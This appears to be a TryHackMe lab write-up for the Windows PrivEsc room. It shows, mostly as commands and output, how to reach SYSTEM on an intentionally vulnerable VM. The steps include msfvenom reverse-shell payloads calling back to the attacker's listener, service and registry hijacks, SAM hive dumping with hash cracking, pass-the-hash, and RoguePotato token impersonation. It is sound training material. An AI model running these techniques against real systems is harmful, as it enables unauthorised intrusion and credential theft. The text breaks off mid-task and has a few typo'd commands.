<h1 align="center">Windows PrivEsc</h1>
<p align="center">2025, October 21  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>533</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321 &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/windows10privesc">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/358f6cfc-e326-44dc-8eb7-e3100f86ef75"></p>

<h1>Summary</h1>
<p>

- [Deploy the Vulnerable Windows VM](#1)<br>
- [Generate a Reverse Shell Executable](#2)<br>
- Service Exploits - [Insecure Service Permissions](#3)<br>
- Service Exploits - [Unquoted Service Path](#4)<br>
- Service Exploits - [Weak Registry Permissions](#5)<br>
- Service Exploits - [Insecure Service Executables](#6)<br>
- Registry - [AutoRuns](#7)<br>
- Registry - [AlwaysInstallElevated](#8)<br>
- Passwords - [Registry](#9)<br>
- Passwords - [Saved Creds](#10)<br>
- Passwords - [Security Account Manager (SAM)](#11)<br>
- Passwords - [Passing the Hash](#12)<br>
- [Scheduled Tasks](#13)<br>
- [Insecure GUI Apps](#14)<br>
- [Startup Apps](#15)<br>
- Token Impersonation - [Rogue Potato](#16)<br>
- Token Impersonation - [PrintSpoofer](#17)<br>
- [Privilege Escalation Scripts](#18)<br></p>


<br>
<h2>Task 1 . Deploy the Vulnerable Windows VM<a id='1'></h2>
<p>This room is aimed at walking you through a variety of Windows Privilege Escalation techniques.<br>

To do this, you must first deploy an intentionally vulnerable Windows VM.<br>

This VM was created by Sagi Shahar as part of his <a href="https://github.com/sagishahar/lpeworkshop">local privilege escalation workshop</a> but has been updated by <a href="https://twitter.com/TibSec">Tib3rius</a> as part of his <a href="https://www.udemy.com/course/windows-privilege-escalation/?referralCode=9A533B41ECB74227E574">Windows Privilege Escalation for OSCP and Beyond!</a> course on Udemy.<br>

Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Windows.<br>

Make sure you are connected to the <a href="https://tryhackme.com/access">TryHackMe VPN</a> or using the in-browser Kali instance before trying to access the Windows VM!<br>

RDP should be available on port 3389 (it may take a few minutes for the service to start). You can login to the "user" account using the password "password321":<br>

<code>xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP</code><br>

The next tasks will walk you through different privilege escalation techniques.<br>

After each technique, you should have a admin or SYSTEM shell.<br>

<ins>Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task</ins>!<br></p>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy the Windows VM and login using the "user" account.<br>
<code>No answer needed</code></p>

```bash
:~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.213.63 /dynamic-resolution
```

<p align="center"><img width="600px" src="https://github.com/user-attachments/assets/7c525352-dd17-49b7-8e00-e1dc5740c33b"></p>

<br>
<h2>Task 2 . Generate a Reverse Shell Executable<a id='2'></a></h2>
<p>On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:<br>

<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe</code><br>

Transfer the reverse.exe file to the C:\PrivEsc directory on Windows. There are many ways you could do this, however the simplest is to start an SMB server on Kali in the same directory as the file, and then use the standard Windows copy command to transfer the file.<br>

On Kali, in the same directory as reverse.exe:<br>

<code>sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .</code><br>

On Windows (update the IP address with your Kali IP):<br>

<code>copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe</code><br>

Test the reverse shell by setting up a netcat listener on Kali:<br>

<code>sudo nc -nvlp 53</code><br>

Then run the reverse.exe executable on Windows and catch the shell:<br>

<code>C:\PrivEsc\reverse.exe</code><br>

The reverse.exe executable will be used in many of the tasks in this room, so don't delete it!</p>

<p><em>Answer the question below</em></p>

<p>2.1. Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!<br>
<code>No answer needed</code></p>

```bash
:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xxx.xx.xxx LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5adcdcd8-0a98-4fea-ad66-2f69cd30ed40"></p>

```bash
:~/WindowsPrivEsc# xfreerdp /u:user /p:password321 /cert:ignore /v:xx.xxx.xx.xx /dynamic-resolution
```

```bash
:~/WindowsPrivEsc# python3.9 /opt/impacket/build/scripts-3.9/smbserver.py xxxxxxxxxxxxxxxxxxx .
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
PS C:\PrivEsc> wget http://xx.xxx.x.xx:8000/reverse.exe -o reverse.exe
```

```bash
:~/WindowsPrivEsc# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xx - - [15/Oct/2025 xx:xx:xx] "GET /reverse.exe HTTP/1.1" 200 -
```

```bash
PS C:\PrivEsc>reverse.exe
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/4c2481e6-38a6-45f1-8842-4a684718f672"></p>



<br>
<h2>Task 3 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Permissions<a id='3'></a></h2>
<p>Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc</code><br>

Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).<br>

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):<br>

<code>sc qc daclsvc</code><br>

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:<br>

<code>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""</code><br>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:<br>

<code>net start daclsvc</code></p>

<p><em>Answer the questions below</em></p>

<p>3.1. What is the original BINARY_PATH_NAME of the daclsvc service?<br>
<code>C:\Program Files\DACL Service\daclservice.exe</code></p>


```bash
C:\PrivEsc>accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\PrivEsc>
```

```bash
C:\PrivEsc>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>
```

```bash
C:\PrivEsc>sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\PrivEsc>
```

```bash
C:\PrivEsc>sc net start daclsvc
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/56686e81-9753-483b-a90d-e497ba14067d"></p>


<br>
<h2>Task 4 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Unquoted Service Path<a id='4'></a></h2>
<p>Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.<br>

<code>sc qc unquotedsvc</code><br>

Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"</code><br>

Copy the reverse.exe executable you created to this directory and rename it Common.exe:<br>

<code>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"</code><br>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:<br>

<code>net start unquotedsvc</code></p>

<p><em>Answer the question below</em></p>

<p>4.1. What is the BINARY_PATH_NAME of the unquotedsvc service?<br>
<code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code></p>

```bash
C:\PrivEsc>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

```bash
C:\PrivEsc>accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

```bash
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.
```

```bash
C:\PrivEsc>net start unquotedsvc
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/59e36553-053f-44e3-9ce6-24b71b75093d"></p>

<br>
<h2>Task 5 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Weak Registry Permissions<a id='5'></h2>

<p><em>Answer the question below</em></p>

<p>5.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>sc qc regsvc
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```bash
C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

```bash
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.
```

```bash
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f            
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f
The operation completed successfully.
```

```bash
C:\PrivEsc>net start regsvc
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/779e2aad-7e4d-46b4-a801-1caa79ff20b5"></p>

<br>
<h2>Task 6 . 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗘𝘅𝗽𝗹𝗼𝗶𝘁𝘀 - Insecure Service Executables<a id='6'></h2>
<p>Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).<br>

<code>sc qc filepermsvc</code><br>

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"</code><br>

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:<br>

<code>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y</code><br>

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:<br>

<code>net start filepermsvc</code></p>

<p><em>Answer the question below</em></p>

<p>6.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>


```bash
C:\PrivEsc>sc qc filepermsvc
sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```bash
C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
	FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/3987011c-672f-4904-a4e9-885e47f4a88d"></p>


```bash
C:\PrivEsc>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.
```

```bash
C:\PrivEsc>net start filepermsvc
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 50045
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/24c8be6f-8eda-408c-96a8-d68c4154ade2"></p>

<br>
<h2>Task 7 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - Autoruns<a id='7'></h2>
<p>Query the registry for AutoRun executables:<br>

<code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code><br>

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"</code><br>

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:<br>

<code>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y</code><br>

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!<br>

<code>rdesktop MACHINE_IP</code></p>

<p><em>Answer the question below</em></p>

<p>7.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

```bash
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/1fdd08a0-5932-4305-a723-469c851e5e2b"></p>


```bash
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

```bash
C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~# apt install rdesktop
```

```bash
:~# rdesktop xx.xxx.xx.xxx
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/39882bd2-ef90-4732-a673-e212e735fd13"></p>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 49704
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<img width="1175" height="696" alt="image" src="https://github.com/user-attachments/assets/acc61026-0ca4-4e91-94e5-0c1d8454f156" />


<br>
<h2>Task 8 . 𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆 - AlwaysInstallElevated<a id='8'></h2>

<p><em>Answer the question below</em></p>

<p>8.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```bash
C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```bash
:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xx.xxx.xx LPORT=9001 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

```bash
PS C:\PrivEsc> wget http://xx.xxx.x.xx:8000/reverse.msi -o reverse.msi
```

<img width="1094" height="690" alt="image" src="https://github.com/user-attachments/assets/230b436b-c714-4f4e-842e-6ea99a6967b3" />


```bash
C:\PrivEsc>msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

```bash
:~/WindowsPrivEsc# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on xx.xxx.xx.xx 49857
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<img width="1162" height="712" alt="image" src="https://github.com/user-attachments/assets/390464e7-9c44-4303-a95a-b8b6d907b89e" />


<br>
<br>
<br>
<h2>Task 9 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Registry<a id='9'></h2>
<p>(For some reason sometimes the password does not get stored in the registry. If this is the case, use the following as the answer: <code>password123</code>)<br>

The registry can be searched for keys and values that contain the word "password":</code><br>

<code>reg query HKLM /f password /t REG_SZ /s<</code><br>

If you want to save some time, query this specific key to find admin AutoLogon credentials:<br>

<code>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"</code><br>

On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):<br>

<code>winexe -U 'admin%password' //MACHINEIP cmd.exe</code></p>

<p><em>Answer the question below</em></p>

<p>9.1. What was the admin password you found in the registry?<br>
<code>password123</code></p>

```bash
C:\Windows\system32>bashreg query HKLM /f password /t REG_SZ /s
```

```bash
C:\Windows\system32>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

<img width="1160" height="658" alt="image" src="https://github.com/user-attachments/assets/1b1a20c9-6e6c-4cf8-8150-b43d9f18c3a2" />


```bash
:~/WindowsPrivEsc# rpcclient -U 'admin' //xx.xxx.xx.xx
Password for [WORKGROUP\admin]:
rpcclient $> 
```

```bash
rpcclient $> enumdomusers
user:[admin] rid:[0x3e9]
user:[Administrator] rid:[0x1f4]
user:[DefaultAccount] rid:[0x1f7]
user:[Guest] rid:[0x1f5]
user:[user] rid:[0x3e8]
user:[WDAGUtilityAccount] rid:[0x1f8]
```

```bash
rpcclient $> enumdomgroups
group:[None] rid:[0x201]
rpcclient $> 
```

<img width="1166" height="262" alt="image" src="https://github.com/user-attachments/assets/2abfa583-1a9f-435a-9e73-ad907c7c631f" />

<br>
<br>
<br>
<h2>Task 10 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Saved Creds<a id='10'></h2>
<p>List any saved credentials:<br>

<code>cmdkey /list</code><br>

Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.<br>

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:<br>

<code>runas /savecred /user:admin C:\PrivEsc\reverse.exe</code></p>

<p><em>Answer the question below</em></p>

<p>10.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>cmdkey /list
```

```bash
C:\PrivEsc>runas /savecred /user:admin reverse.exe
```

<img width="887" height="554" alt="image" src="https://github.com/user-attachments/assets/c28bb856-3768-4341-9c0b-bbfec5cc699c" />

<br>
<br>
<br>
<h2>Task 11 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Security Account Manager (SAM)<a id='11'></h2>
<p>The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.<br>

Transfer the SAM and SYSTEM files to your Kali VM:</p>

<p><code>copy C:\Windows\Repair\SAM \\10.10.10.10\kali\</code><br>
<code>copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\</code></p>

<p>On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:<br>

<code>git clone https://github.com/Tib3rius/creddump7</code><br>
<code>pip3 install pycrypto</code><br>
<code>python3 creddump7/pwdump.py SYSTEM SAM</code></p>

<p>Crack the admin NTLM hash using hashcat:<br>

<code>hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt</code><br>

You can use the cracked password to log in as the admin using winexe or RDP.</p>

<p><em>Answer the question below</em></p>

<p>11.1. What is the NTLM hash of the admin user?<br>
<code>a9fdfa038c4b75ebc76dc855dd74f0da</code></p>


```bash
:~/WindowsPrivEsc# git clone https://github.com/Tib3rius/creddump7
Cloning into 'creddump7'...
remote: Enumerating objects: 107, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 107 (delta 0), reused 1 (delta 0), pack-reused 102 (from 1)
Receiving objects: 100% (107/107), 51.65 KiB | 12.91 MiB/s, done.
Resolving deltas: 100% (55/55), done.
```

```bash
:~/WindowsPrivEsc# pip3 install pycrypto
Requirement already satisfied: pycrypto in /usr/lib/python3/dist-packages (2.6.1)
...
```

```bash
:~/WindowsPrivEsc# john --format=NT Hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1167" height="241" alt="image" src="https://github.com/user-attachments/assets/228add03-d7de-4198-b9ae-ebe2957d1c43" />


<br>
<h2>Task 12 . 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱𝘀 - Passing the Hash<a id='12'></h2>
<p>Why crack a password hash when you can authenticate using the hash?<br>

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:<br>

<code>pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe</code></p>

<p><em>Answer the question below</em></p>

<p>12.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 13 . Scheduled Tasks<a id='13'></h2>
<p>View the contents of the C:\DevTools\CleanUp.ps1 script:<br>

<code>type C:\DevTools\CleanUp.ps1</code><br>

The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1</code><br>

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:<br>

<code>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1</code><br>

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.</p>

<p><em>Answer the question below</em></p>

<p>13.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 14 . Insecure GUI Apps<a id='14'></h2>
<p>Start an RDP session as the "user" account:<br>

<code>rdesktop -u user -p password321 MACHINE_IP</code><br>

Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:<br>

<code>tasklist /V | findstr mspaint.exe</code><br>

In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe<br>

Press Enter to spawn a command prompt running with admin privileges.</p>

<p><em>Answer the question below</em></p>

<p>14.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 15 . Startup Apps<a id='15'></h2>
<p>Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:<br>

<code>C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"</code><br>

Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:<br>

<code>cscript C:\PrivEsc\CreateShortcut.vbs</code><br>

Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:<br>

<code>rdesktop -u admin MACHINE_IP</code><br>

A shell running as admin should connect back to your listener.</p>

<p><em>Answer the question below</em></p>

<p>15.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 16 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - Rogue Porato<a id='16'></h2>
<p>Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:<br>

<code>sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999</code><br>

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:<br>

<code>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe</code><br>

Start another listener on Kali.<br>

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):<br>

<code>C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999</code></p>

<p><em>Answer the questions below</em></p>

<p>16.1.  Name one user privilege that allows this exploit to work.<br>
<code>SeImpersonatePrivilege</code></p>


```bash
:~/WindowsPrivEsc# :~/WindowsPrivEsc# socat tcp-listen:135,reuseaddr,fork tcp:10.10.213.63:9999
```

```bash
:~/WindowsPrivEsc# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
C:\PrivEsc>PsExec64.exe -i -u "NT AUTHORITY\local service" C:\PrivEsc\reverse.exe
```

```bash
:~/WindowsPrivEsc# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xx 49905
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```bash
C:\PrivEsc>whoami /priv
```

<img width="1158" height="632" alt="image" src="https://github.com/user-attachments/assets/24b49fe9-2540-40ed-a313-fde511572921" />

<img width="1160" height="810" alt="image" src="https://github.com/user-attachments/assets/07a1537a-1c25-4f37-9183-c60fad3c3913" />

<img width="1166" height="805" alt="image" src="https://github.com/user-attachments/assets/2656d907-40ba-493c-b3fb-e6dc4b8a0a12" />


<br>
<p>16.2. NName the other user privilege that allows this exploit to work..<br>
<code>SeAssignPrimaryTokenPrivilege</code></p>

```bash
:~/WindowsPrivEsc# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xx.xxx.xx LPORT=1337 -f exe -o reverse2.exe
